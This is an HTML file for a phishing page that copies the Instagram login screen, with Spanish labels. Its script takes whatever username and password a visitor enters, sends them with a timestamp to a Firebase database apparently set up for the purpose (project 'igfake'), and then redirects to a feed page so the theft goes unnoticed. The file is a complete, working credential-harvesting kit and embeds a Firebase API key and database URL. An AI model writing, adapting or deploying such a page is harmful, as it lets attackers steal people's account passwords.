<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Instagram</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="login-box">
  <h1 class="logo">Instagram</h1>

  <input type="text" id="username" placeholder="Teléfono, usuario o correo">
  <input type="password" id="password" placeholder="Contraseña">

  <button onclick="login()">Iniciar sesión</button>
</div>

<!-- Firebase -->
<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>

<script>
const firebaseConfig = {
  apiKey: "AIzaSyAbdaVElHd5TjcCYbZxC1yuogKm04n89tw",
  authDomain: "igfake-78794.firebaseapp.com",
  databaseURL: "https://igfake-78794-default-rtdb.firebaseio.com",
  projectId: "igfake-78794",
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

function login() {
  let user = document.getElementById("username").value;
  let pass = document.getElementById("password").value;

  db.ref("usuarios").push({
    usuario: user,
    contraseña: pass,
    fecha: new Date().toLocaleString()
  });

  window.location.href = "feed.html";
}
</script>

</body>
</html>
